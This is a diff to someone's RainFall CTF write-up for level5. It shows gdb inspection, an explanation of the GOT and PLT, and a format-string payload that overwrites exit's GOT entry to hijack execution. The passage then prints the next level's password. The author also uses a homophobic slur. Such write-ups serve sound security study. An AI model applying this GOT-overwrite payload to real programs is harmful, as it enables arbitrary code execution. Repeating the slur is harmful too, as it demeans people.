@@ -616,3 +616,61 @@ OFFSET   TYPE              VALUE
 08049838 R_386_JUMP_SLOT   exit
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
+**need to find that function's address**
+```
+(gdb) x o
+0x80484a4 <o>:  0x83e58955
+```
+**well fucking kill me, the stupid n function has no return, but instead calls exit(1), the fuck is this gay shit**
+```
+call    printf
+mov     dword [esp], 0x1
+call    exit
+```
+*now I need address of exit I guess*
+
+Googled, there's a **Global Offset Table**, it is used when you're unable to modify the address pointed to by EIP with a shellcode address, *perfect for me*, so this shit allows to redirect execution flow of a program.
+
+### GOT
+**The Global Offset Table redirects position independent address calculations to an absolute location and is located in the .got section of an ELF executable or shared object.**
+
+*this is stolen from somewhere, don't remember*
+
+So this shit stores the final (absolute) location of a function call symbol, used in dynamically linked code. 
+
+```
+(gdb) disas exit
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:     jmp    *0x8049838
+```
+*so, we are at the **Procedure Linkage Table PLT** which works along side the GOT to reference and relocate function resolution, it performs a **jmp in to the GOT** to find location of called function*
+
+*at the start of our program, when a function is on it's first call there will be no entry in the GOT, so the PLT will hand the request to the rtld so it can resolve the functions absolute location. The GOT is then updated for future use.*
+```
+   0x080483d6 <+6>:     push   $0x28
+   0x080483db <+11>:    jmp    0x8048370
+End of assembler dump.
+```
+*The stack is set up for resolving the function, next 0x28 is pushed to the stack and jmp to 0x8048370 is performed, which then calls _dl_runtime_resolve.*
+```
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:       0x080483d6
+```
+So the address of exit is **0x08049838**, we need to exploit format string by modifying this address by address of o function **0x80484a4**
+```
+level5@RainFall:~$ python -c "print '\x38\x98\x04\x08' + '%x ' * 6" | ./level5 
+8200 b7fd1ac0 b7ff37d0 8049838 25207825 78252078
+```
+4th
+```
+level5@RainFall:~$ python -c "print '\x38\x98\x04\x08%4\$x'" | ./level5 
+88049838
+```
+So we need to override it with address of o, thats 4 bytes, perfect
+```
+$python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/tfou
+$cat /tmp/tfou - | ./level5
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
+## level6
